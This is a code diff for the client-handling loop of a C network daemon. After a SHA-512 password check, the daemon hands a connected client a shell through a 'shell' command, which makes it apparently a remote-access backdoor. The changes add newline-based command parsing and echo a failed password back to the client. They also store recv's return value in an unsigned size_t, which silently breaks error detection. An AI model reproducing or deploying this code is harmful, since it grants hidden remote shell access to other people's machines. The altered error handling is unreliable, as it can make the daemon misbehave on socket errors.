@@ -1,23 +1,23 @@
 #include "durex.h"
 
-const uint32_t hashed_passwd[16] = {
-	0x4f5aa3f3,
-	0x5a25d0c3,
-	0x09d8420d,
-	0x56fa998b,
-	0xacaa46b3,
-	0x42296990,
-	0x6b014a42,
-	0x2c262597,
-	0x3bbfa635,
-	0x6178407f,
-	0x40f3fb78,
-	0x241229cf,
-	0x9ec0741e,
-	0xa5264289,
-	0xd2019bd4,
-	0x262c04c3
-};
+// const uint32_t hashed_passwd[16] = {
+// 	0x4f5aa3f3,
+// 	0x5a25d0c3,
+// 	0x09d8420d,
+// 	0x56fa998b,
+// 	0xacaa46b3,
+// 	0x42296990,
+// 	0x6b014a42,
+// 	0x2c262597,
+// 	0x3bbfa635,
+// 	0x6178407f,
+// 	0x40f3fb78,
+// 	0x241229cf,
+// 	0x9ec0741e,
+// 	0xa5264289,
+// 	0xd2019bd4,
+// 	0x262c04c3
+// };
 
 
 static void	disconnect_user(t_client_data *client)
@@ -69,20 +69,21 @@ static void	spawn_shell(t_client_data *client)
 		disconnect_user(client);
 }
 
-static void	handle_message(t_client_data *client)
+static void	handle_message(t_client_data *client, char *command)
 {
-	uint32_t	passwd_hash[16];
+	uint8_t		passwd_hash[64];
 	char		passwd_str[16 * 8 + 1];
 
 	if (client->is_logged == 0)
 	{
-		sha512(passwd_hash, client->read_buffer, client->rbuffer_pos * 8);
-		for (size_t i = 0; i < 16; i++)
-			sprintf(passwd_str + i * 8, "%08x", passwd_hash[i]);
+		sha512((uint32_t*)passwd_hash, command, ft_strlen(command) * 8);
+		ft_bzero(command, ft_strlen(command));
+		for (size_t i = 0; i < 64; i++)
+			sprintf(passwd_str + i * 2, "%02x", passwd_hash[i]);
 		passwd_str[16 * 8] = 0;
-		//dprintf(client->fd, "%s", passwd_str);
 		if (strcmp(passwd_str, PASSWD_STR))
 		{
+			dprintf(client->fd, "%s\n", command);
 			send(client->fd, WRONG_PASSWORD, sizeof(WRONG_PASSWORD) - 1, 0);
 			disconnect_user(client);
 			return ;
@@ -92,14 +93,14 @@ static void	handle_message(t_client_data *client)
 	}
 	else
 	{
-		if (!strcmp(client->read_buffer, "help"))
+		if (!strcmp(command, "help"))
 			client_fill_buffer(client, HELP_MESSAGE, sizeof(HELP_MESSAGE) - 1);
-		else if (!strcmp(client->read_buffer, "exit"))
+		else if (!strcmp(command, "exit"))
 		{
 			disconnect_user(client);
 			return ;
 		}
-		else if (!strcmp(client->read_buffer, "shell"))
+		else if (!strcmp(command, "shell"))
 			spawn_shell(client);
 		else
 			client_fill_buffer(client, UNKNOWN_COMMAND, sizeof(UNKNOWN_COMMAND) - 1);
@@ -109,8 +110,9 @@ static void	handle_message(t_client_data *client)
 
 void		client_read(t_server_data *data, size_t client_id)
 {
-	ssize_t			ret;
+	size_t			ret;
 	t_client_data	*client;
+	size_t			i;
 
 	client = &data->clients[client_id];
 	ret = recv(client->fd, client->read_buffer + client->rbuffer_pos,
@@ -121,15 +123,25 @@ void		client_read(t_server_data *data, size_t client_id)
 		return ;
 	}
 	client->rbuffer_pos += (size_t)ret;
-	if (*(client->read_buffer + client->rbuffer_pos - 1) == '\n')
-	{
-		*(client->read_buffer + client->rbuffer_pos - 1) = '\0';
-		handle_message(client);
-		client->rbuffer_pos = 0;
-	}
-	else if (client->rbuffer_pos == CLIENT_BUFFER_SIZE - 1)
+	if (client->rbuffer_pos == CLIENT_BUFFER_SIZE - 1)
 	{
 		client_fill_buffer(client, COMMAND_TOO_LONG, sizeof(COMMAND_TOO_LONG) - 1);
 		client->rbuffer_pos = 0;
+		return ;
 	}
+	i = 0;
+	while (i < client->rbuffer_pos)
+	{
+		if (client->read_buffer[i] == '\n')
+		{
+			client->read_buffer[i] = '\0';
+			handle_message(client, client->read_buffer);
+			ft_memmove(client->read_buffer, client->read_buffer + i + 1, client->rbuffer_pos - i);
+			client->rbuffer_pos -= i + 1;
+			i = 0;
+		}
+		else
+			i++;
+	}
+	
 }
